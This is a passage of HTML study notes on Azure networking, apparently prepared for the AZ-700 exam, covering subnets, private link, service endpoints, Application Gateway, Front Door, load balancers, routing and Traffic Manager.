<li>Custom routes can direct traffic to specific network appliances or on-premises networks.</li>
</ul>
</li>
<li>
<p><strong>Service Endpoints:</strong></p>
<ul>
<li>Enable service endpoints to secure Azure service resources (like Azure Storage or Azure SQL Database) to your VNet.</li>
<li>Traffic to these services can remain within the Azure backbone network.</li>
</ul>
</li>
<li>
<p><strong>Integration with Azure Services:</strong></p>
<ul>
<li>Subnets can host various Azure resources, such as Virtual Machines (VMs), Azure Kubernetes Service (AKS), and App Service Environments (ASE).</li>
<li>Subnets can be part of an Azure Availability Zone, enhancing resilience and availability.</li>
<li>A full list of services that support vNet integration can be found here: 
<a href="https://docs.microsoft.com/en-us/azure/virtual-network/virtual-network-service-endpoints-overview#services-that-support-virtual-network-service-endpoints">Azure Services that support vNet Integration</a></li>
</ul>
</li>
<li>
<p><strong>Subnet Delegation:</strong></p>
<ul>
<li>Delegate a subnet to specific Azure services to simplify network configuration and management.</li>
<li>Examples of delegatable services include Azure Container Instances and Azure App Service.</li>
</ul>
</li>
<li>
<p><strong>Subnet Peering:</strong></p>
<ul>
<li>Use VNet peering to connect subnets across different VNets, allowing resources to communicate securely.</li>
<li>Peered VNets can be within the same region or across different Azure regions (Global VNet Peering).</li>
</ul>
</li>
</ol>
<h2 id="best-practices-1"><a class="header" href="#best-practices-1">Best Practices</a></h2>
<ol>
<li>
<p><strong>Designing Subnets:</strong></p>
<ul>
<li>Plan subnets based on application tiers (e.g., web, application, database) to improve security and manageability.</li>
<li>Ensure enough IP addresses in each subnet to accommodate future growth.</li>
</ul>
</li>
<li>
<p><strong>Security:</strong></p>
<ul>
<li>Apply NSGs at both the subnet and network interface level for layered security.</li>
<li>Regularly review and update NSG rules to maintain optimal security.</li>
</ul>
</li>
<li>
<p><strong>Monitoring and Management:</strong></p>
<ul>
<li>Use Azure Monitor and Network Watcher to monitor subnet performance and diagnose network issues.</li>
<li>Implement logging for NSGs to track and analyze network traffic.</li>
</ul>
</li>
<li>
<p><strong>IP Address Management:</strong></p>
<ul>
<li>Avoid overlapping IP address ranges when peering VNets.</li>
<li>Use private IP ranges for subnets to ensure secure and efficient routing within Azure.</li>
</ul>
</li>
</ol>
<h2 id="use-cases-1-1"><a class="header" href="#use-cases-1-1">Use Cases</a></h2>
<ul>
<li><strong>Isolating Resources:</strong> Segregate different types of workloads or environments (development, testing, production) within a VNet using NSGs.</li>
<li><strong>Enhanced Security:</strong> Apply NSGs to subnets for controlling traffic flow and securing resources.</li>
<li><strong>Network Organization:</strong> Organize resources logically within a VNet for better management and scalability.</li>
<li><strong>Service Integration:</strong> Securely connect Azure services to your VNet using service endpoints or private link.</li>
</ul>
<h2 id="facts"><a class="header" href="#facts">Facts</a></h2>
<ul>
<li>A vNet can have up to 3000 subnets</li>
<li>Azure reserves 5 IP addreses within each subnet for system use. These addresses cannot be used. The first four and the last IP address cannot be allocated to a resource.
<ul>
<li>The first IP address is the network address.</li>
<li>The last IP address is the broadcast address.</li>
<li>The next three IP addresses are reserved for Azure services. (Default Gateway and 2 DNS Servers)</li>
</ul>
</li>
<li>If you need to modify the address space of a subnet that already has resources in it, you must first remove all resources from the subnet.</li>
</ul>
<p>Azure subnets are essential for structuring your VNet, ensuring security, and managing resources efficiently within your Azure environment.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="design-and-implement-private-access"><a class="header" href="#design-and-implement-private-access">Design-and-implement-private-access</a></h1>
<h2 id="directory-map-6"><a class="header" href="#directory-map-6">Directory Map</a></h2>
<ul>
<li><a href="#private-link">private-link</a></li>
<li><a href="#azure-service-endpoint">service-endpoints</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="private-link"><a class="header" href="#private-link">Private Link</a></h1>
<p>A Private Link in Azure is a network interface that connects you privately and securely to a service powered by Azure Private Link. Here are the key points about private endpoints:</p>
<ul>
<li>Private Link/private endpoints offer an advantage over the service endpoint option. On-premises networks can access platform services privately over a ExpressRoute or VPN connection through the private endpoint. Service endpoints do not offer this capability.</li>
<li>If we have implemented a virtual WAN architecture, private endpoints can only be deployed on spoke virtual networks connected to the virtual hub. Implementing private endpoints directly on the virtual hub is not supported.</li>
<li>Supported Azure services can be accessed over private endpoints, but you need to register those private endpoint records in a corresponding private DNS zone.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="azure-service-endpoint"><a class="header" href="#azure-service-endpoint">Azure Service Endpoint</a></h1>
<h2 id="overview-1"><a class="header" href="#overview-1">Overview</a></h2>
<p>Azure Service Endpoint is a feature that provides direct connectivity from a virtual network to Azure services. It extends the identity of your virtual network to the Azure services over a direct connection. The traffic to the Azure service always remains on the Microsoft Azure backbone network. Service Endpoints are not supported across different AD tenants for most services, except for Azure Storage and Azure Key Vault.</p>
<h2 id="service-endpoint-policy"><a class="header" href="#service-endpoint-policy">Service Endpoint Policy</a></h2>
<p>Service Endpoint Policies allow us to control the Azure Service that will be reachable via a Service Endpoint. They provide an additional layer of security to ensure that a service endpoint cannot be used to access all instances of a resource type. For example, if we have a Microsoft.Storage service endpoint on a subnet, we can create a Service Endpoint Policy to allow access to only a specific storage account. Without the policy, the service endpoint can be used to access all storage accounts in the region.</p>
<ul>
<li>Currently, only the Microsoft.Storage provider is compatible with Service Endpoint Policies.</li>
<li>We can scope access to one of three options:
<ul>
<li>All storage accounts in the subscription</li>
<li>All storage accounts in a specific resource group</li>
<li>A specific storage account</li>
</ul>
</li>
</ul>
<h2 id="example-usage"><a class="header" href="#example-usage">Example Usage</a></h2>
<ol>
<li>Create a Service Endpoint Policy</li>
<li>Associate the Service Endpoint Policy with a subnet</li>
</ol>
<p><img src="clouds/azure/az700/images/service-endpoint-policy.png" alt="Service Endpoint Policy"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="design-and-implement-routing"><a class="header" href="#design-and-implement-routing">Design-and-implement-routing</a></h1>
<h2 id="directory-map-7"><a class="header" href="#directory-map-7">Directory Map</a></h2>
<ul>
<li><a href="#application-gateway">application-gateway</a></li>
<li><a href="#azure-availability-sets">availability-sets</a></li>
<li><a href="#azure-front-door">front-door</a></li>
<li><a href="#azure-load-balancer">load-balancer</a></li>
<li><a href="#azure-virtual-network-routing">routing</a></li>
<li><a href="#traffic-manager">traffic-manager</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="application-gateway"><a class="header" href="#application-gateway">Application Gateway</a></h1>
<h2 id="overview-2"><a class="header" href="#overview-2">Overview</a></h2>
<ul>
<li>An Azure Application Gateway is a regional web traffic load balancer that enables you to manage traffic to your web applications. It provides various layer 7 load balancing capabilities for your applications, including SSL termination, cookie-based session affinity, URL-based routing, and multi-site routing. Here are the key features and benefits of Azure Application Gateway:</li>
<li><strong>Layer 7 Load Balancing</strong>: Application Gateway operates at the application layer (layer 7) of the OSI model, allowing you to route traffic based on URL paths or hostnames.</li>
<li><strong>SSL Termination</strong>: Application Gateway can terminate SSL connections, offloading the SSL decryption/encryption process from your web servers.</li>
<li><strong>Cookie-Based Session Affinity</strong>: Application Gateway supports cookie-based session affinity, ensuring that client requests are directed to the same backend server for the duration of a session.</li>
<li><strong>URL-Based Routing</strong>: You can configure Application Gateway to route traffic based on URL paths, enabling you to direct requests to different backend pools based on the URL.</li>
<li><strong>Multi-Site Routing</strong>: Application Gateway supports routing traffic to multiple websites hosted on the same set of backend servers, allowing you to host multiple sites on a single set of servers.</li>
<li><strong>Web Application Firewall (WAF)</strong>: Application Gateway includes a Web Application Firewall (WAF) that provides protection against common web vulnerabilities and attacks, such as SQL injection and cross-site scripting.</li>
</ul>
<h2 id="use-cases-6"><a class="header" href="#use-cases-6">Use Cases</a></h2>
<ul>
<li><strong>Web Application Load Balancing</strong>: Application Gateway is commonly used to distribute traffic across multiple web servers hosting web applications.</li>
<li><strong>SSL Offloading</strong>: By terminating SSL connections at the gateway, Application Gateway can reduce the load on backend servers and improve performance.</li>
<li><strong>Session Affinity</strong>: Cookie-based session affinity ensures that client requests are consistently directed to the same backend server, maintaining session state.</li>
<li><strong>URL-Based Routing</strong>: Application Gateway can route traffic based on URL paths, enabling you to direct requests to specific backend pools based on the U.</li>
</ul>
<h2 id="components-1"><a class="header" href="#components-1">Components</a></h2>
<ul>
<li>
<p><strong>Frontend IP Configuration</strong>: Defines the public IP address and port used to access the Application Gateway.</p>
</li>
<li>
<p><strong>Backend Target</strong>:</p>
<ul>
<li>Backend Pool: Contains the backend servers that receive the traffic from the Application Gateway. Consists of Azure VMs, VMSS‚Äô Azure Web Apps, or one-premises servers.</li>
<li>Redirection: Redirects traffic to a external site or a listener.
<ul>
<li>An external site refers to an endpoint outside of the application gateway. -</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>HTTP Settings</strong>: Define how the Application Gateway communicates with the backend servers, including port, protocol, and cookie settings.</p>
</li>
<li>
<p><strong>HTTP Listener</strong>: Listens for incoming HTTP/HTTPS traffic and routes it to the appropriate backend pool based on the URL path or hostname.</p>
</li>
<li>
<p><strong>URL Path-Based Routing Rules</strong>: Define rules that route traffic to different backend pools based on the URL path.</p>
</li>
</ul>
<h2 id="deployment"><a class="header" href="#deployment">Deployment</a></h2>
<ul>
<li>Application Gateway must be deployed into an empty subnet within a virtual network.</li>
<li>You can create an Application Gateway using the Azure portal, Azure PowerShell, Azure CLI, or ARM templates.</li>
</ul>
<h2 id="tiers"><a class="header" href="#tiers">Tiers</a></h2>
<ul>
<li><strong>Standard</strong>: Offers additional features such as autoscaling, SSL offloading
<ul>
<li>The standard tier offers 3 size options: Small, Medium, and Large</li>
</ul>
</li>
<li><strong>WAF</strong>: Provides protection against common web vulnerabilities and attacks.
<ul>
<li>The WAF tier offers 2 size options: Medium and Large</li>
</ul>
</li>
</ul>
<h2 id="waf"><a class="header" href="#waf">WAF</a></h2>
<ul>
<li>The Web Application Firewall (WAF) feature of Application Gateway provides centralized protection for your web applications from common web-based attacks.</li>
<li>WAF uses OWASP (Open Web Application Security Project) rules to protect against threats such as SQL injection, cross-site scripting, and remote file inclusion.</li>
<li>You can customize WAF rules to meet the specific security requirements of your web applications.</li>
<li>WAF logs provide detailed information about web application attacks and security events, helping you monitor and respond to potential threats.</li>
<li>There are two tiers of WAF available: WAF v1 and WAF v2. WAF v2 offers enhanced security features and performance improvements over WAF v1.</li>
</ul>
<h2 id="backend-targets"><a class="header" href="#backend-targets">Backend Targets</a></h2>
<ul>
<li>Two types of backend targets can be configured:
<ul>
<li>backend pools
<ul>
<li>a collection of IP addresses or FQDNs, VM instances or VMSS</li>
<li>You can configure up to 100 backend address pools and 1200 targets per pool</li>
</ul>
</li>
<li>redirection
<ul>
<li>Redirections are used to redirect incoming traffic from the application gateway to an external site or listener</li>
</ul>
</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="azure-availability-sets"><a class="header" href="#azure-availability-sets">Azure Availability Sets</a></h1>
<p>Azure Availability Sets are a feature in Microsoft Azure that ensures high availability for your virtual machines (VMs). They provide redundancy and improve the reliability of applications and services by distributing VMs across multiple isolated hardware nodes within a data center. Here are the key points about Azure Availability Sets:</p>
<ol>
<li>
<p><strong>Fault Domains</strong>: VMs within an availability set are spread across multiple fault domains, which are groups of hardware that share a common power source and network switch. This distribution helps to protect your application from hardware failures.</p>
</li>
<li>
<p><strong>Update Domains</strong>: VMs are also spread across multiple update domains, which are groups of hardware that can be updated and rebooted simultaneously. This minimizes the impact of maintenance operations, ensuring that not all VMs are down during updates.</p>
</li>
<li>
<p><strong>Redundancy and Resilience</strong>: By spreading VMs across different fault and update domains, availability sets ensure that at least some instances of your application remain running during hardware failures or maintenance events.</p>
</li>
<li>
<p><strong>Service Level Agreement (SLA)</strong>: Using availability sets can help you achieve a higher SLA for your application. Azure provides a 99.95% SLA for VMs that are part of an availability set.</p>
</li>
<li>
<p><strong>Scalability</strong>: Availability sets allow you to scale your application horizontally by adding more VMs, which are automatically distributed across fault and update domains.</p>
</li>
<li>
<p><strong>Configuration</strong>: When creating an availability set, you can specify the number of fault and update domains. Azure will then manage the distribution of your VMs accordingly.</p>
</li>
</ol>
<p>By using Azure Availability Sets, you can enhance the availability and reliability of your applications and services.</p>
<h1 id="azure-availability-zones"><a class="header" href="#azure-availability-zones">Azure Availability Zones</a></h1>
<p>Azure Availability Zones are a high-availability offering that protects applications and data from data center failures. They are physically separate locations within an Azure region, each with independent power, cooling, and networking. Here are the key points about Azure Availability Zones:</p>
<ol>
<li>
<p><strong>Physical Separation</strong>: Availability Zones are isolated from each other, ensuring that a failure in one zone does not affect the others. This physical separation enhances fault tolerance and disaster recovery.</p>
</li>
<li>
<p><strong>Redundancy and Reliability</strong>: Applications and data are replicated across zones, providing redundancy and higher reliability. This helps to ensure that services remain available even if one zone experiences an outage.</p>
</li>
<li>
<p><strong>Service Level Agreement (SLA)</strong>: Azure offers a 99.99% SLA for virtual machines running in availability zones, which is higher than the SLA for availability sets.</p>
</li>
<li>
<p><strong>Data Residency</strong>: Availability Zones ensure that your data remains within the same Azure region, complying with data residency and compliance requirements.</p>
</li>
<li>
<p><strong>Automatic Replication</strong>: Services such as virtual machines, managed disks, and databases can be automatically replicated across zones to ensure high availability.</p>
</li>
<li>
<p><strong>Scalability</strong>: Availability Zones support scaling out applications by deploying resources across multiple zones, thereby improving performance and availability.</p>
</li>
<li>
<p><strong>Disaster Recovery</strong>: By using availability zones, you can implement robust disaster recovery solutions, minimizing downtime and data loss during catastrophic events.</p>
</li>
</ol>
<p>By leveraging Azure Availability Zones, you can significantly enhance the availability, reliability, and resilience of your applications and services.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="azure-front-door"><a class="header" href="#azure-front-door">Azure Front Door</a></h1>
<ul>
<li>Azure Front Door is a global, scalable entry-point that uses the Microsoft global edge network to create fast, secure, and widely scalable web applications.</li>
<li>Azure Front Door provides a range of features, including global load balancing, WAF capabilities, and statis and dynamic content caching (CDN) capabilities.</li>
<li>By default, Azure Front Door will route requests to the endpoint with the lowest latency using one of it‚Äôs 150 global points of presence.</li>
</ul>
<h2 id="overview-3"><a class="header" href="#overview-3">Overview</a></h2>
<ul>
<li><strong>Global Load Balancing</strong>: Azure Front Door provides global load balancing to ensure that users are directed to the closest and healthiest endpoint.</li>
<li><strong>Web Application Firewall (WAF)</strong>: Azure Front Door includes a Web Application Firewall (WAF) that provides protection against common web vulnerabilities and attacks.</li>
<li><strong>SSL Offloading</strong>: Azure Front Door can terminate SSL connections, offloading the SSL decryption/encryption process from your web servers.</li>
<li><strong>Session Affinity</strong>: Azure Front Door supports session affinity, ensuring that client requests are directed to the same backend server for the duration of a session.</li>
<li><strong>URL-Based Routing</strong>: You can configure Azure Front Door to route traffic based on URL paths, enabling you to direct requests to different backend pools based on the URL.</li>
<li><strong>Custom Domains</strong>: Azure Front Door supports custom domains, allowing you to use your own domain name for the service.</li>
<li><strong>Scalability</strong>: Azure Front Door is designed to scale automatically based on demand, ensuring that your application can handle increased traffic.</li>
<li><strong>Monitoring and Analytics</strong>: Azure Front Door provides detailed monitoring and analytics to help you track the performance and health of your web applications.</li>
<li><strong>High Availability</strong>: Azure Front Door is built on a highly available and resilient infrastructure, ensuring that your applications remain accessible even in the event of failures.</li>
<li><strong>Integration with Azure Services</strong>: Azure Front Door can be integrated with other Azure services, such as Azure CDN and Azure Application Gateway, to provide additional functionality and capabilities.</li>
</ul>
<h2 id="cdn"><a class="header" href="#cdn">CDN</a></h2>
<ul>
<li>Azure Front Door can serve as a content delivery network (CDN) by caching content at edge locations to reduce latency and improve performance.</li>
</ul>
<h2 id="components-2"><a class="header" href="#components-2">Components</a></h2>
<ul>
<li>An instance of the Front Door service is referred to as the Front Door Profile. We can create up to 500 Standard or Premium Front Door Profiles per subscription.</li>
<li>To perform it‚Äôs functions, Azure Front Door relies on 3 components:
<ul>
<li><strong>Endpoints</strong>: Receives incoming traffic
<ul>
<li>10 endpoints can be created for a Standard Tier Front Door Profile.</li>
<li>25 Endpoints can be created for a Premium Tier Profile.</li>
<li>When you create an endpoint, a default domain name is created for you. You can choose to create a custom domain as well. Standard Tier supports up to 100 custom domains, while Premium Tier supports up to 500 custom domains.
<ul>
<li>When adding a custom domain, HTTPS is enforced and we need to specify the SSL/TLS certificate to use. Two options are available for this:
<ul>
<li><strong>Azure Managed Certificate</strong>: Azure Front Door will automatically create and manage the certificate for you. Not available for Wildcard domains. Only available for apex domains and subdomains.</li>
<li><strong>Bring Your Own Certificate (BYOC)</strong>: You can upload your own certificate.</li>
<li>Renewal for apex domain certificates requires domain revalidation.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><strong>Origin Groups</strong>: Like a backend pool, where requests are distributed to.
<ul>
<li>Front Door supports both Azure and non-Azure endpoints.</li>
</ul>
</li>
<li><strong>Routes</strong>: Map Endpoints to Origin Groups
<ul>
<li>We can add up to 100 routes for a Standard Tier Front Door Profile and 200 routes for a Premium Tier Profile.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="rule-sets"><a class="header" href="#rule-sets">Rule Sets</a></h2>
<ul>
<li>To perform more granular processing or customizations beyond the capabilities of routes in Front Door, we can use rule sets. Rule sets are a set of rules that can be applied to incoming traffic to Front Door. The allow for granular customization of how requests are handled at the Front Door edge and can even override the origin group for a given request. In a Standard tier resource, we can have a max of 100 rule sets, while in a premium tier resource we can have up to 200 rule sets.</li>
<li>Rule sets consists of if/then/else rules.</li>
</ul>
<h2 id="service-tiers-sku"><a class="header" href="#service-tiers-sku">Service Tiers (SKU)</a></h2>
<ul>
<li>
<p>Azure Front Door is offered in 3 tiers:</p>
<ul>
<li><strong>Classic</strong>: The original service tier for front door. Uses the <code>Microsoft.Network</code> provider and does not support many features. Microsoft no longer recommends using this tier. Microsoft offers a zero-downtime migration path to the Standard and Premium tiers.</li>
<li><strong>Standard</strong>: Uses the <code>Microsoft.Cdn</code> provider.</li>
<li><strong>Premium</strong>: Uses the <code>Microsoft.Cdn</code> provider.</li>
</ul>
<p><img src="clouds/azure/az700/images/front-door-service-tiers.png" alt=""></p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="azure-load-balancer"><a class="header" href="#azure-load-balancer">Azure Load Balancer</a></h1>
<h2 id="backend-pools"><a class="header" href="#backend-pools">Backend Pools</a></h2>
<ul>
<li>Backend pools contain resources for the load balancer to distribute traffic to</li>
<li>Resources can be VMs, VMSS, or IP addresses</li>
</ul>
<h2 id="health-probes"><a class="header" href="#health-probes">Health Probes</a></h2>
<ul>
<li>You can configure Health Probes so that the load balancer only sends traffic to a healthy instance of the backend pool</li>
</ul>
<h2 id="skus"><a class="header" href="#skus">SKUs</a></h2>
<ul>
<li>
<p>Standard</p>
<ul>
<li>Charge per hour</li>
<li>The machines in the backend pool can be in an Availability Set, VMSS, or stand-alone VMs</li>
<li>Health Probes can be TCP, HTTP, or HTTPS</li>
<li>Supports Availability Zones</li>
<li>99.99% SLA</li>
<li>Requires that the public IP address also be in the Standard SKU</li>
<li>Can be implemented as a public or internal load balancer</li>
<li>Supports a global deployment option, but you must choose a ‚Äòhome‚Äô region. The backend pool will then have one or more regional load balancers. The frontend IP must be static and is advertised to other Azure regions via Anycast.;;;;</li>
<li>The standard load balancer has 3 availability zone configuration options: zonal, zone-redundant, and non-zonal.
<ul>
<li>a zonal configuration allows the load balancer to distribute requests to resources in a single zone</li>
<li>a non-zonal configuration is relatively uncommon and is generally used to distribute requests to workloads that have not been pinned to a specific zone.</li>
<li>a zone-redundant configuration allows the load balancer to distribute requests to resources in any zone the load balancer is deployed in.</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Basic (Retiring soon)</p>
<ul>
<li>Free</li>
<li>The machines in the backend pool need to be part of an availability set or VMSS</li>
<li>Health probes can be TCP or HTTP</li>
<li>No support for Availability Zones</li>
<li>No SLA</li>
</ul>
</li>
<li>
<p>Gateway</p>
<ul>
<li>Catered for high performance and HA scenarios with third party NVA‚Äôs (Network Virtual Appliances)</li>
</ul>
</li>
</ul>
<h2 id="nat"><a class="header" href="#nat">NAT</a></h2>
<ul>
<li>You can use NAT rules to translate a single public IP address into multiple backend resources with private IP addresses</li>
</ul>
<h2 id="outbound-rules"><a class="header" href="#outbound-rules">Outbound Rules</a></h2>
<p>Azure Load Balancer outbound rules define how outbound connections from your virtual machines (VMs) are handled. These rules determine the allocation and management of public IP addresses for outbound traffic from VMs within a virtual network. Here are the key points about Azure Load Balancer outbound rules:</p>
<ol>
<li><strong>Outbound Connectivity</strong>: Outbound rules provide connectivity for VMs to the internet by assigning a public IP address to the outbound traffic, ensuring VMs can initiate connections to external resources.</li>
<li><strong>SNAT (Source Network Address Translation)</strong>: Outbound rules use SNAT to translate private IP addresses of VMs to a public IP address for outbound traffic. This allows multiple VMs to share the same public IP for outbound connections.</li>
<li><strong>Public IP Allocation</strong>: You can associate a public IP address or a pool of public IP addresses with the load balancer to manage outbound connectivity. This provides control over the IP addresses used for outbound traffic.</li>
<li><strong>Port Management</strong>: Outbound rules manage the available ports for outbound connections. By default, Azure Load Balancer uses ephemeral ports for SNAT, but you can configure custom port ranges to optimize the use of available ports.</li>
<li><strong>Idle Timeout</strong>: Outbound rules include an idle timeout setting that defines the duration a connection can remain idle before being closed. This helps manage and free up unused connections.</li>
<li><strong>Scaling</strong>: Outbound rules support scaling scenarios where you can distribute outbound traffic across multiple public IP addresses to handle high traffic volumes and ensure availability.</li>
<li><strong>Configuration</strong>: Outbound rules can be configured in the Azure portal, through Azure PowerShell, or using Azure CLI. You can specify parameters such as the public IP address, port ranges, and idle timeout settings.</li>
<li><strong>Security</strong>: By controlling outbound traffic through outbound rules, you can enhance the security of your VMs by ensuring that only allowed outbound connections are established.</li>
</ol>
<p>By configuring Azure Load Balancer outbound rules, you can effectively manage and optimize the outbound connectivity of your virtual machines, ensuring reliable and controlled access to external resources.</p>
<h2 id="internal-azure-load-balancer"><a class="header" href="#internal-azure-load-balancer">Internal Azure Load Balancer</a></h2>
<p>An Internal Azure Load Balancer (ILB) is a load balancing service that distributes network traffic across virtual machines (VMs) within a virtual network (VNet) without exposing them to the internet. It is designed for private, internal applications and services. Here are the key points about an Internal Azure Load Balancer:</p>
<ol>
<li><strong>Private IP Address</strong>: The ILB operates using a private IP address within your VNet, ensuring that traffic is only accessible internally and not exposed to the internet.</li>
<li><strong>Load Balancing Algorithms</strong>: ILB distributes incoming traffic across multiple VMs using various load balancing algorithms, such as round-robin and hash-based distribution, to optimize resource usage and performance.</li>
<li><strong>High Availability</strong>: By distributing traffic across multiple VMs, ILB enhances the availability and reliability of your internal applications and services, ensuring they remain accessible even if individual VMs fail.</li>
<li><strong>Health Probes</strong>: ILB uses health probes to monitor the status of VMs and ensure traffic is only directed to healthy instances. This helps maintain the stability and performance of your applications.</li>
<li><strong>Configuration Flexibility</strong>: You can configure ILB to balance traffic for different types of services, such as TCP, UDP, HTTP, and HTTPS, allowing for a wide range of internal application scenarios.</li>
<li><strong>Integration with Network Security</strong>: ILB can be integrated with Azure Network Security Groups (NSGs) and Azure Firewall;jjj to enhance the security of your internal network traffic.</li>
<li><strong>Scalability</strong>: ILB supports scaling out by adding more VMs to the backend pool, ensuring that your internal applications can handle increased traffic and load.</li>
<li><strong>Use Cases</strong>: Common use cases for ILB include load balancing for internal line-of-business applications, databases, private APIs, and microservices within a VNet.</li>
<li><strong>Configuration Management</strong>: ILB can be configured and managed using the Azure portal, Azure PowerShell, Azure CLI, and Azure Resource Manager (ARM) templates.</li>
</ol>
<p>By using an Internal Azure Load Balancer, you can efficiently manage and distribute internal network traffic, ensuring high availability, performance, and security for your private applications and services.</p>
<h2 id="cross-region-global-load-balancer"><a class="header" href="#cross-region-global-load-balancer">Cross Region (Global) Load Balancer</a></h2>
<ul>
<li>Cross region load balancer is a global load balancer that can distribute traffic across multiple regions</li>
<li>You must still create a load balancer in each region</li>
<li>The global load balancer must be deployed in a ‚Äòhome region‚Äô</li>
<li>A global load balancer must be a public, Standard SKU load balancer</li>
<li>The global load balancer uses the geo-proximity load-balancing algorithm to determine the optimal routing path for network traffic. This algorithm directs requests to the nearest ‚Äúparticipating‚Äù region based on the geographic location of the client creating the request.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="azure-virtual-network-routing"><a class="header" href="#azure-virtual-network-routing">Azure Virtual Network Routing</a></h1>
<h2 id="system-routes"><a class="header" href="#system-routes">System Routes</a></h2>
<ul>
<li>Azure vNet system routes are automatically created and maintained by Azure to enable routing between subnets, on-premises networks, and the internet.</li>
<li>Azure vNet system routes are automatically associated via a default route table to the vNet.</li>
<li>System Routes are a collection of routing entries that define several destination networks and the next hop to send the traffic to. This is the path that the traffic should follow to get to the destination.</li>
</ul>
<h2 id="modifying-the-default-routing-behavior"><a class="header" href="#modifying-the-default-routing-behavior">Modifying the default routing behavior</a></h2>
<ul>
<li>You can override the default system routes by creating User Defined Routes (UDRs) and associating them with subnets in your Azure Virtual Network (VNet) or by using BGP.</li>
</ul>
<h2 id="user-defined-routes-udr"><a class="header" href="#user-defined-routes-udr">User Defined Routes (UDR)</a></h2>
<ul>
<li>You can have up to 200 custom route tables per region per subscription.</li>
<li>A subnet can be associated with only one route table at a time.</li>
<li>Azure User Defined Routes (UDR) allow you to control the routing of traffic leaving a subnet in an Azure Virtual Network (VNet).</li>
<li>UDRs are used to override Azure‚Äôs default system routes, which control traffic between subnets, on-premises networks, and the internet.</li>
<li>UDRs can be used to direct traffic to specific next hops, such as virtual appliances, network virtual appliances (NVAs), or virtual machines (VMs).</li>
<li>UDRs are associated with subnets within a VNet and are evaluated in priority order to determine the routing of outbound traffic.</li>
<li>UDRs can be created, modified, and deleted using the Azure portal, Azure PowerShell, Azure CLI, or Azure Resource Manager (ARM) templates.</li>
<li>UDRs are commonly used in scenarios where you need to route traffic through specific network devices, apply network security policies, or optimize traffic flow within your Azure environment.</li>
<li>UDRs can be used in conjunction with Azure Virtual Network Gateways, Azure ExpressRoute, Azure VPN Gateway, and other networking services to control the flow of traffic in and out of your Azure Virtual Network.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="traffic-manager"><a class="header" href="#traffic-manager">Traffic Manager</a></h1>
<p>Traffic Manager is a DNS based traffic load balancing service</p>
<h2 id="overview-4"><a class="header" href="#overview-4">Overview</a></h2>
<ul>
<li>Traffic manager is a global service. You do not select a region when you deploy it.</li>
<li>Traffic Manager uses DNS to direct client requests to the most appropriate service endpoint based on a traffic-routing method and the health of the endpoints.</li>
<li>Traffic Manager can improve the availability and responsiveness of your application.</li>
<li>Traffic Manager can be used to:
<ul>
<li>Load balance incoming traffic across multiple Azure regions</li>
<li>Route traffic to a specific region based on the client‚Äôs geographic location</li>
<li>Route traffic to a specific region based on the endpoint‚Äôs health</li>
<li>Route traffic to a specific region based on the endpoint‚Äôs performance</li>
</ul>
</li>
<li>Traffic Manager supports multiple DNS routing methods, including:
<ul>
<li>Priority</li>
<li>Weighted</li>
<li>Performance</li>
<li>Geographic</li>
<li>Multi-value</li>
</ul>
</li>
<li>Traffic Manager can be used with Azure services, external services, and on-premises services. The endpoint must be public.
<ul>
<li>Traffic Manager does not support routing to private IP addresses.</li>
</ul>
</li>
</ul>
<h2 id="endpoint-types"><a class="header" href="#endpoint-types">Endpoint types:</a></h2>
<ul>
<li>Azure Endpoint:
<ul>
<li>Cloud Service, Web App, Public IP</li>
</ul>
</li>
<li>External Endpoint</li>
<li>Nested TM Profile</li>
</ul>
<h2 id="traffic-routing-methods"><a class="header" href="#traffic-routing-methods">Traffic Routing Methods</a></h2>
<ul>
<li>Priority Routing Method
<ul>
<li>Traffic Manager directs traffic to the primary endpoint. If the primary endpoint is unavailable, Traffic Manager fails over to the secondary endpoint.</li>
</ul>
</li>
<li>Performance Routing Method
<ul>
<li>Traffic Manager directs traffic to the endpoint with the lowest latency.</li>
</ul>
</li>
<li>Geographic Routing Method
<ul>
<li>Traffic Manager directs traffic to the endpoint based on the geographic location of the client (where the DNS query originates from).</li>
</ul>
</li>
<li>Subnet Routing Method
<ul>
<li>Traffic Manager directs traffic to the endpoint based on the IP address of the client.</li>
</ul>
</li>
<li>Weighted Routing Method
<ul>
<li>Traffic Manager distributes traffic across multiple endpoints based on a user-defined weight.</li>
</ul>
</li>
<li>Multi-value Routing Method
<ul>
<li>Traffic Manager returns multiple endpoints in the DNS response, and the client selects one.</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="design-implement-and-manage-hybrid-networking"><a class="header" href="#design-implement-and-manage-hybrid-networking">Design-implement-and-manage-hybrid-networking</a></h1>
<h2 id="directory-map-8"><a class="header" href="#directory-map-8">Directory Map</a></h2>
<ul>
<li><a href="#azure-express-route">express-route</a></li>
<li><a href="#vpn">vpn</a></li>
<li><a href="#azure-virtual-wan">vwan</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="azure-express-route"><a class="header" href="#azure-express-route">Azure Express Route</a></h1>
<h2 id="overview-5"><a class="header" href="#overview-5">Overview</a></h2>
<ul>
<li>Azure ExpressRoute lets you extend your on-premises networks into the Microsoft cloud over a private connection facilitated by a connectivity provider.</li>
<li>With ExpressRoute, you can establish connections to Microsoft cloud services, such as Microsoft Azure, Office 365, and Dynamics 365.</li>
<li>ExpressRoute connections do not go over the public Internet, and offer more reliability, faster speeds, lower latencies, and higher security than typical connections over the Internet.</li>
<li>ExpressRoute connections typically have redundant connectivity from the partner network into the Microsoft Edge</li>
</ul>
<h2 id="benefits-1"><a class="header" href="#benefits-1">Benefits</a></h2>
<ul>
<li>Layer 3 connectivity between your on-premises network and the Microsoft Cloud through a connectivity provider.</li>
